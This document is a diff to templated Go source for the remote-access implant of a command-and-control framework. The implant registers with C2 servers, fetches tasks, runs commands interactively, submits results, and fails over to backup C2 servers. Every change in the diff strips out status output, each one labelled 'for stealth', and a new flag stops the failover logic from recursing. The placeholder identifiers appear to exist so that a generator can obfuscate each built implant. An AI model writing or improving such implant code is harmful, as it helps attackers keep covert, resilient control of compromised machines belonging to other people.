@@ -450,6 +450,7 @@ type {AGENT_STRUCT_NAME} struct {
 	{AGENT_CURRENT_FAIL_COUNT_FIELD}    int
 	{AGENT_MAX_FAIL_COUNT_FIELD}        int
 	{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} time.Time
+	{AGENT_IN_FAILOVER_ATTEMPT_FIELD}   bool
 }
 
 type {TASK_STRUCT_NAME} struct {
@@ -534,6 +535,7 @@ func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, re
 		{AGENT_CURRENT_FAIL_COUNT_FIELD}:    0,
 		{AGENT_MAX_FAIL_COUNT_FIELD}:        15,  // Try main C2 for ~15 * heartbeat_interval before failover
 		{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}: time.Now(),
+		{AGENT_IN_FAILOVER_ATTEMPT_FIELD}:   false,
 	}
 
 	return agent, nil
@@ -1365,8 +1367,10 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 			a.{AGENT_RESET_FAIL_COUNT_FUNC}()
 			break
 		} else {
-			fmt.Printf("[-] Registration failed: %v\n", err)
-			a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+			// Don't print anything for stealth - increment fail count only if not in failover attempt
+			if !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
+				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+			}
 		}
 		time.Sleep(30 * time.Second)
 	}
@@ -1399,14 +1403,15 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
 				}
 			} else {
-				fmt.Printf("[-] Failed to check interactive status: %v\n", err)
+				// Failed to check interactive status, but don't print anything for stealth
+				_ = err // Use the error variable to avoid unused variable warning
 			}
 		}
 
 		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
 			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
 			if err != nil {
-				fmt.Printf("[-] Failed to get tasks: %v\n", err)
+				// Failed to get tasks, but don't print anything for stealth
 				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 				time.Sleep(30 * time.Second)
 				continue
@@ -1420,7 +1425,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
 				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
 				if err != nil {
-					fmt.Printf("[-] Failed to submit task result: %v\n", err)
+					// Failed to submit task result, but don't print anything for stealth
 					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 				} else {
 					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
@@ -1429,14 +1434,14 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 		} else {
 			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
 			if err != nil {
-				fmt.Printf("[-] Failed to get interactive command: %v\n", err)
+				// Failed to get interactive command, but don't print anything for stealth
 				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 			} else if interactiveTask != nil {
 				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
 				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
 				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
 				if err != nil {
-					fmt.Printf("[-] Failed to submit interactive result: %v\n", err)
+					// Failed to submit interactive result, but don't print anything for stealth
 					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 				} else {
 					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
@@ -1868,6 +1873,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
 		return false
 	}
 
+	// Set flag to indicate we're in a failover attempt to prevent recursion
+	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = true
+
 	// Try to register with a failover C2
 	originalC2URL := a.{AGENT_CURRENT_C2_URL_FIELD}
 	for _, failoverURL := range a.{AGENT_FAILOVER_URLS_FIELD} {
@@ -1876,13 +1884,14 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
 		// Try to register with the failover server
 		err := a.{AGENT_REGISTER_FUNC}()
 		if err == nil {
-			fmt.Printf("[+] Successfully connected to failover C2: %s\n", failoverURL)
+			// Successfully connected to failover C2
 			a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0  // Reset failure count
 			a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
+			a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
 			return true
 		} else {
 			// If registration failed, try the next failover URL
-			fmt.Printf("[-] Failed to connect to failover C2: %s, error: %v\n", failoverURL, err)
+			// Don't print anything for stealth
 			// Continue to the next URL
 		}
 	}
@@ -1890,6 +1899,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
 	// If all failover attempts failed, return to the original main C2
 	a.{AGENT_CURRENT_C2_URL_FIELD} = originalC2URL
 	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
+	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
 	return false
 }
 
@@ -1897,8 +1907,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INCREMENT_FAIL_COUNT_FUNC}() {
 	a.{AGENT_CURRENT_FAIL_COUNT_FIELD}++
 	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
 
-	// If we haven't reached the maximum fail count, try failover
-	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} {
+	// If we've reached the maximum fail count, try failover, but only if not already in a failover attempt
+	// to prevent recursion
+	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} && !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
 		a.{AGENT_TRY_FAILOVER_FUNC}()
 	}
 }
